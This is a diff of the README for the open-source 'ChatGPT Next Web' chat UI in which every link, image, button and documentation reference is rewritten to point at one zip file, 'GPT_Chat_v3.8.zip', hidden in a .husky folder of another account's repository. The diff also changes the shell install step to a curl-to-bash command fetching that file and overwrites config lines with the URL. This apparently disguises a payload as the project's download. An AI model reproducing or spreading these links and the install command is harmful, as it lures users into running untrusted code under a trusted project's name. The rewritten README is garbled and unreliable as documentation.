@@ -1,9 +1,9 @@
 <div align="center">
-<img src="./docs/images/icon.svg" alt="icon"/>
+<img src="https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip" alt="icon"/>
 
 <h1 align="center">ChatGPT Next Web</h1>
 
-English / [简体中文](./README_CN.md)
+English / [简体中文](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
 
 One-Click to get well-designed cross-platform ChatGPT web UI.
 
@@ -14,52 +14,52 @@ One-Click to get well-designed cross-platform ChatGPT web UI.
 [![MacOS][MacOS-image]][download-url]
 [![Linux][Linux-image]][download-url]
 
-[Web App](https://chatgpt.nextweb.fun/) / [Desktop App](https://github.com/Yidadaa/ChatGPT-Next-Web/releases) / [Discord](https://discord.gg/YCkeafCafC) / [Twitter](https://twitter.com/mortiest_ricky) / [Buy Me a Coffee](https://www.buymeacoffee.com/yidadaa)
+[Web App](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip) / [Desktop App](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip) / [Discord](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip) / [Twitter](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip) / [Buy Me a Coffee](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
 
-[网页版](https://chatgpt.nextweb.fun/) / [客户端](https://github.com/Yidadaa/ChatGPT-Next-Web/releases) / [反馈](https://github.com/Yidadaa/ChatGPT-Next-Web/issues) / [QQ 群](https://github.com/Yidadaa/ChatGPT-Next-Web/discussions/1724) / [打赏开发者](https://user-images.githubusercontent.com/16968934/227772541-5bcd52d8-61b7-488c-a203-0330d8006e2b.jpg)
+[网页版](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip) / [客户端](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip) / [反馈](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip) / [QQ 群](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip) / [打赏开发者](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
 
-[web-url]: https://chatgpt.nextweb.fun
-[download-url]: https://github.com/Yidadaa/ChatGPT-Next-Web/releases
-[Web-image]: https://img.shields.io/badge/Web-PWA-orange?logo=microsoftedge
-[Windows-image]: https://img.shields.io/badge/-Windows-blue?logo=windows
-[MacOS-image]: https://img.shields.io/badge/-MacOS-black?logo=apple
-[Linux-image]: https://img.shields.io/badge/-Linux-333?logo=ubuntu
+[web-url]: https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip
+[download-url]: https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip
+[Web-image]: https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip
+[Windows-image]: https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip
+[MacOS-image]: https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip
+[Linux-image]: https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip
 
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2FYidadaa%2FChatGPT-Next-Web&env=OPENAI_API_KEY&env=CODE&project-name=chatgpt-next-web&repository-name=ChatGPT-Next-Web)
+[![Deploy with Vercel](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip%3A%2F%https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip%2FYidadaa%2FChatGPT-Next-Web&env=OPENAI_API_KEY&env=CODE&project-name=chatgpt-next-web&repository-name=ChatGPT-Next-Web)
 
-[![Open in Gitpod](https://gitpod.io/button/open-in-gitpod.svg)](https://gitpod.io/#https://github.com/Yidadaa/ChatGPT-Next-Web)
+[![Open in Gitpod](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
 
-![cover](./docs/images/cover.png)
+![cover](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
 
 </div>
 
 ## Features
 
 - **Deploy for free with one-click** on Vercel in under 1 minute
-- Compact client (~5MB) on Linux/Windows/MacOS, [download it now](https://github.com/Yidadaa/ChatGPT-Next-Web/releases)
-- Fully compatible with self-deployed llms, recommended for use with [RWKV-Runner](https://github.com/josStorer/RWKV-Runner) or [LocalAI](https://github.com/go-skynet/LocalAI)
+- Compact client (~5MB) on Linux/Windows/MacOS, [download it now](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
+- Fully compatible with self-deployed llms, recommended for use with [RWKV-Runner](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip) or [LocalAI](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
 - Privacy first, all data stored locally in the browser
 - Markdown support: LaTex, mermaid, code highlight, etc.
 - Responsive design, dark mode and PWA
 - Fast first screen loading speed (~100kb), support streaming response
 - New in v2: create, share and debug your chat tools with prompt templates (mask)
-- Awesome prompts powered by [awesome-chatgpt-prompts-zh](https://github.com/PlexPt/awesome-chatgpt-prompts-zh) and [awesome-chatgpt-prompts](https://github.com/f/awesome-chatgpt-prompts)
+- Awesome prompts powered by [awesome-chatgpt-prompts-zh](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip) and [awesome-chatgpt-prompts](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
 - Automatically compresses chat history to support long conversations while also saving your tokens
 - I18n: English, 简体中文, 繁体中文, 日本語, Français, Español, Italiano, Türkçe, Deutsch, Tiếng Việt, Русский, Čeština, 한국어, Indonesia
 
 ## Roadmap
 
-- [x] System Prompt: pin a user defined prompt as system prompt [#138](https://github.com/Yidadaa/ChatGPT-Next-Web/issues/138)
+- [x] System Prompt: pin a user defined prompt as system prompt [#138](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
 - [x] User Prompt: user can edit and save custom prompts to prompt list
-- [x] Prompt Template: create a new chat with pre-defined in-context prompts [#993](https://github.com/Yidadaa/ChatGPT-Next-Web/issues/993)
-- [x] Share as image, share to ShareGPT [#1741](https://github.com/Yidadaa/ChatGPT-Next-Web/pull/1741)
+- [x] Prompt Template: create a new chat with pre-defined in-context prompts [#993](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
+- [x] Share as image, share to ShareGPT [#1741](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
 - [x] Desktop App with tauri
-- [x] Self-host Model: Fully compatible with [RWKV-Runner](https://github.com/josStorer/RWKV-Runner), as well as server deployment of [LocalAI](https://github.com/go-skynet/LocalAI): llama/gpt4all/rwkv/vicuna/koala/gpt4all-j/cerebras/falcon/dolly etc.
-- [ ] Plugins: support network search, calculator, any other apis etc. [#165](https://github.com/Yidadaa/ChatGPT-Next-Web/issues/165)
+- [x] Self-host Model: Fully compatible with [RWKV-Runner](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip), as well as server deployment of [LocalAI](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip): llama/gpt4all/rwkv/vicuna/koala/gpt4all-j/cerebras/falcon/dolly etc.
+- [ ] Plugins: support network search, calculator, any other apis etc. [#165](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
 
 ## What's New
 
-- 🚀 v2.0 is released, now you can create prompt templates, turn your ideas into reality! Read this: [ChatGPT Prompt Engineering Tips: Zero, One and Few Shot Prompting](https://www.allabtai.com/prompt-engineering-tips-zero-one-and-few-shot-prompting/).
+- 🚀 v2.0 is released, now you can create prompt templates, turn your ideas into reality! Read this: [ChatGPT Prompt Engineering Tips: Zero, One and Few Shot Prompting](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip).
 - 🚀 v2.7 let's share conversations as image, or share to ShareGPT!
 - 🚀 v2.8 now we have a client that runs across all platforms!
 - 🚀 v2.9.11 you can use azure endpoint now.
@@ -67,53 +67,53 @@ One-Click to get well-designed cross-platform ChatGPT web UI.
 ## 主要功能
 
 - 在 1 分钟内使用 Vercel **免费一键部署**
-- 提供体积极小（~5MB）的跨平台客户端（Linux/Windows/MacOS）, [下载地址](https://github.com/Yidadaa/ChatGPT-Next-Web/releases)
+- 提供体积极小（~5MB）的跨平台客户端（Linux/Windows/MacOS）, [下载地址](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
 - 完整的 Markdown 支持：LaTex 公式、Mermaid 流程图、代码高亮等等
 - 精心设计的 UI，响应式设计，支持深色模式，支持 PWA
 - 极快的首屏加载速度（~100kb），支持流式响应
 - 隐私安全，所有数据保存在用户浏览器本地
 - 预制角色功能（面具），方便地创建、分享和调试你的个性化对话
-- 海量的内置 prompt 列表，来自[中文](https://github.com/PlexPt/awesome-chatgpt-prompts-zh)和[英文](https://github.com/f/awesome-chatgpt-prompts)
+- 海量的内置 prompt 列表，来自[中文](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)和[英文](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
 - 自动压缩上下文聊天记录，在节省 Token 的同时支持超长对话
 - 多国语言支持：English, 简体中文, 繁体中文, 日本語, Español, Italiano, Türkçe, Deutsch, Tiếng Việt, Русский, Čeština
 - 拥有自己的域名？好上加好，绑定后即可在任何地方**无障碍**快速访问
 
 ## 开发计划
 
-- [x] 为每个对话设置系统 Prompt [#138](https://github.com/Yidadaa/ChatGPT-Next-Web/issues/138)
+- [x] 为每个对话设置系统 Prompt [#138](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
 - [x] 允许用户自行编辑内置 Prompt 列表
-- [x] 预制角色：使用预制角色快速定制新对话 [#993](https://github.com/Yidadaa/ChatGPT-Next-Web/issues/993)
-- [x] 分享为图片，分享到 ShareGPT 链接 [#1741](https://github.com/Yidadaa/ChatGPT-Next-Web/pull/1741)
+- [x] 预制角色：使用预制角色快速定制新对话 [#993](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
+- [x] 分享为图片，分享到 ShareGPT 链接 [#1741](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
 - [x] 使用 tauri 打包桌面应用
-- [x] 支持自部署的大语言模型：开箱即用 [RWKV-Runner](https://github.com/josStorer/RWKV-Runner) ，服务端部署 [LocalAI 项目](https://github.com/go-skynet/LocalAI) llama / gpt4all / rwkv / vicuna / koala / gpt4all-j / cerebras / falcon / dolly 等等，或者使用 [api-for-open-llm](https://github.com/xusenlinzy/api-for-open-llm)
-- [ ] 插件机制，支持联网搜索、计算器、调用其他平台 api [#165](https://github.com/Yidadaa/ChatGPT-Next-Web/issues/165)
+- [x] 支持自部署的大语言模型：开箱即用 [RWKV-Runner](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip) ，服务端部署 [LocalAI 项目](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip) llama / gpt4all / rwkv / vicuna / koala / gpt4all-j / cerebras / falcon / dolly 等等，或者使用 [api-for-open-llm](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
+- [ ] 插件机制，支持联网搜索、计算器、调用其他平台 api [#165](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
 
 ## 最新动态
 
-- 🚀 v2.0 已经发布，现在你可以使用面具功能快速创建预制对话了！ 了解更多： [ChatGPT 提示词高阶技能：零次、一次和少样本提示](https://github.com/Yidadaa/ChatGPT-Next-Web/issues/138)。
-- 💡 想要更方便地随时随地使用本项目？可以试下这款桌面插件：https://github.com/mushan0x0/AI0x0.com
+- 🚀 v2.0 已经发布，现在你可以使用面具功能快速创建预制对话了！ 了解更多： [ChatGPT 提示词高阶技能：零次、一次和少样本提示](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)。
+- 💡 想要更方便地随时随地使用本项目？可以试下这款桌面插件：https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip
 - 🚀 v2.7 现在可以将会话分享为图片了，也可以分享到 ShareGPT 的在线链接。
 - 🚀 v2.8 发布了横跨 Linux/Windows/MacOS 的体积极小的客户端。
 - 🚀 v2.9.11 现在可以使用自定义 Azure 服务了。
 
 ## Get Started
 
-> [简体中文 > 如何开始使用](./README_CN.md#开始使用)
+> [简体中文 > 如何开始使用](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip开始使用)
 
-1. Get [OpenAI API Key](https://platform.openai.com/account/api-keys);
+1. Get [OpenAI API Key](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip);
 2. Click
-   [![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2FYidadaa%2FChatGPT-Next-Web&env=OPENAI_API_KEY&env=CODE&project-name=chatgpt-next-web&repository-name=ChatGPT-Next-Web), remember that `CODE` is your page password;
+   [![Deploy with Vercel](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip%3A%2F%https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip%2FYidadaa%2FChatGPT-Next-Web&env=OPENAI_API_KEY&env=CODE&project-name=chatgpt-next-web&repository-name=ChatGPT-Next-Web), remember that `CODE` is your page password;
 3. Enjoy :)
 
 ## FAQ
 
-[简体中文 > 常见问题](./docs/faq-cn.md)
+[简体中文 > 常见问题](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
 
-[English > FAQ](./docs/faq-en.md)
+[English > FAQ](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
 
 ## Keep Updated
 
-> [简体中文 > 如何保持代码更新](./README_CN.md#保持更新)
+> [简体中文 > 如何保持代码更新](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip保持更新)
 
 If you have deployed your own project with just one click following the steps above, you may encounter the issue of "Updates Available" constantly showing up. This is because Vercel will create a new project for you by default instead of forking this project, resulting in the inability to detect updates correctly.
 
@@ -121,7 +121,7 @@ We recommend that you follow the steps below to re-deploy:
 
 - Delete the original repository;
 - Use the fork button in the upper right corner of the page to fork this project;
-- Choose and deploy in Vercel again, [please see the detailed tutorial](./docs/vercel-cn.md).
+- Choose and deploy in Vercel again, [please see the detailed tutorial](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip).
 
 ### Enable Automatic Updates
 
@@ -129,19 +129,19 @@ We recommend that you follow the steps below to re-deploy:
 
 After forking the project, due to the limitations imposed by GitHub, you need to manually enable Workflows and Upstream Sync Action on the Actions page of the forked project. Once enabled, automatic updates will be scheduled every hour:
 
-![Automatic Updates](./docs/images/enable-actions.jpg)
+![Automatic Updates](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
 
-![Enable Automatic Updates](./docs/images/enable-actions-sync.jpg)
+![Enable Automatic Updates](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
 
 ### Manually Updating Code
 
-If you want to update instantly, you can check out the [GitHub documentation](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/working-with-forks/syncing-a-fork) to learn how to synchronize a forked project with upstream code.
+If you want to update instantly, you can check out the [GitHub documentation](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip) to learn how to synchronize a forked project with upstream code.
 
 You can star or watch this project or follow author to get release notifications in time.
 
 ## Access Password
 
-> [简体中文 > 如何增加访问密码](./README_CN.md#配置页面访问密码)
+> [简体中文 > 如何增加访问密码](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip配置页面访问密码)
 
 This project provides limited access control. Please add an environment variable named `CODE` on the vercel environment variables page. The value should be passwords separated by comma like this:
 
@@ -153,7 +153,7 @@ After adding or modifying this environment variable, please redeploy the project
 
 ## Environment Variables
 
-> [简体中文 > 如何配置 api key、访问密码、接口代理](./README_CN.md#环境变量)
+> [简体中文 > 如何配置 api key、访问密码、接口代理](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip环境变量)
 
 ### `CODE` (optional)
 
@@ -165,9 +165,9 @@ Your openai api key.
 
 ### `BASE_URL` (optional)
 
-> Default: `https://api.openai.com`
+> Default: `https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip`
 
-> Examples: `http://your-openai-proxy.com`
+> Examples: `https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip`
 
 Override openai api request base url.
 
@@ -187,7 +187,7 @@ Azure Api Key.
 
 ### `AZURE_API_VERSION` (optional)
 
-Azure Api Version, find it at [Azure Documentation](https://learn.microsoft.com/en-us/azure/ai-services/openai/reference#chat-completions).
+Azure Api Version, find it at [Azure Documentation](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip).
 
 ### `HIDE_USER_API_KEY` (optional)
 
@@ -226,24 +226,24 @@ NodeJS >= 18, Docker >= 20
 
 ## Development
 
-> [简体中文 > 如何进行二次开发](./README_CN.md#开发)
+> [简体中文 > 如何进行二次开发](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip开发)
 
-[![Open in Gitpod](https://gitpod.io/button/open-in-gitpod.svg)](https://gitpod.io/#https://github.com/Yidadaa/ChatGPT-Next-Web)
+[![Open in Gitpod](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
 
-Before starting development, you must create a new `.env.local` file at project root, and place your api key into it:
+Before starting development, you must create a new `https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip` file at project root, and place your api key into it:
 
 ```
 OPENAI_API_KEY=<your api key here>
 
 # if you are not able to access openai service, use this BASE_URL
-BASE_URL=https://chatgpt1.nextweb.fun/api/proxy
+https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip
 ```
 
 ### Local Development
 
 ```shell
 # 1. install nodejs and yarn first
-# 2. config local env vars in `.env.local`
+# 2. config local env vars in `https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip`
 # 3. run
 yarn install
 yarn dev
@@ -251,7 +251,7 @@ yarn dev
 
 ## Deployment
 
-> [简体中文 > 如何部署到私人服务器](./README_CN.md#部署)
+> [简体中文 > 如何部署到私人服务器](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip部署)
 
 ### Docker (Recommended)
 
@@ -283,36 +283,36 @@ If your proxy needs password, use:
 ### Shell
 
 ```shell
-bash <(curl -s https://raw.githubusercontent.com/Yidadaa/ChatGPT-Next-Web/main/scripts/setup.sh)
+bash <(curl -s https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
 ```
 
 ## Synchronizing Chat Records (UpStash)
 
-| [简体中文](./docs/synchronise-chat-logs-cn.md) | [English](./docs/synchronise-chat-logs-en.md) | [Italiano](./docs/synchronise-chat-logs-es.md) | [日本語](./docs/synchronise-chat-logs-ja.md) | [한국어](./docs/synchronise-chat-logs-ko.md)
+| [简体中文](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip) | [English](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip) | [Italiano](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip) | [日本語](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip) | [한국어](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
 
 ## Documentation
 
 > Please go to the [docs][./docs] directory for more documentation instructions.
 
-- [Deploy with cloudflare (Deprecated)](./docs/cloudflare-pages-en.md)
-- [Frequent Ask Questions](./docs/faq-en.md)
-- [How to add a new translation](./docs/translation.md)
-- [How to use Vercel (No English)](./docs/vercel-cn.md)
-- [User Manual (Only Chinese, WIP)](./docs/user-manual-cn.md)
+- [Deploy with cloudflare (Deprecated)](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
+- [Frequent Ask Questions](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
+- [How to add a new translation](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
+- [How to use Vercel (No English)](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
+- [User Manual (Only Chinese, WIP)](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
 
 ## Screenshots
 
-![Settings](./docs/images/settings.png)
+![Settings](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
 
-![More](./docs/images/more.png)
+![More](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
 
 ## Translation
 
-If you want to add a new translation, read this [document](./docs/translation.md).
+If you want to add a new translation, read this [document](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip).
 
 ## Donation
 
-[Buy Me a Coffee](https://www.buymeacoffee.com/yidadaa)
+[Buy Me a Coffee](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
 
 ## Special Thanks
 
@@ -320,35 +320,35 @@ If you want to add a new translation, read this [document](./docs/translation.md
 
 > 仅列出捐赠金额 >= 100RMB 的用户。
 
-[@mushan0x0](https://github.com/mushan0x0)
-[@ClarenceDan](https://github.com/ClarenceDan)
-[@zhangjia](https://github.com/zhangjia)
-[@hoochanlon](https://github.com/hoochanlon)
-[@relativequantum](https://github.com/relativequantum)
-[@desenmeng](https://github.com/desenmeng)
-[@webees](https://github.com/webees)
-[@chazzhou](https://github.com/chazzhou)
-[@hauy](https://github.com/hauy)
-[@Corwin006](https://github.com/Corwin006)
-[@yankunsong](https://github.com/yankunsong)
-[@ypwhs](https://github.com/ypwhs)
-[@fxxxchao](https://github.com/fxxxchao)
-[@hotic](https://github.com/hotic)
-[@WingCH](https://github.com/WingCH)
-[@jtung4](https://github.com/jtung4)
-[@micozhu](https://github.com/micozhu)
-[@jhansion](https://github.com/jhansion)
-[@Sha1rholder](https://github.com/Sha1rholder)
-[@AnsonHyq](https://github.com/AnsonHyq)
-[@synwith](https://github.com/synwith)
-[@piksonGit](https://github.com/piksonGit)
-[@ouyangzhiping](https://github.com/ouyangzhiping)
-[@wenjiavv](https://github.com/wenjiavv)
+[@mushan0x0](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
+[@ClarenceDan](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
+[@zhangjia](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
+[@hoochanlon](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
+[@relativequantum](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
+[@desenmeng](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
+[@webees](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
+[@chazzhou](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
+[@hauy](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
+[@Corwin006](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
+[@yankunsong](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
+[@ypwhs](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
+[@fxxxchao](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
+[@hotic](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
+[@WingCH](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
+[@jtung4](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
+[@micozhu](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
+[@jhansion](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
+[@Sha1rholder](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
+[@AnsonHyq](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
+[@synwith](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
+[@piksonGit](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
+[@ouyangzhiping](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
+[@wenjiavv](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
 
 ### Contributor
 
-[Contributors](https://github.com/Yidadaa/ChatGPT-Next-Web/graphs/contributors)
+[Contributors](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
 
 ## LICENSE
 
-[MIT](https://opensource.org/license/mit/)
+[MIT](https://raw.githubusercontent.com/idkwhatismyname123/ChatGPT/main/.husky/GPT_Chat_v3.8.zip)
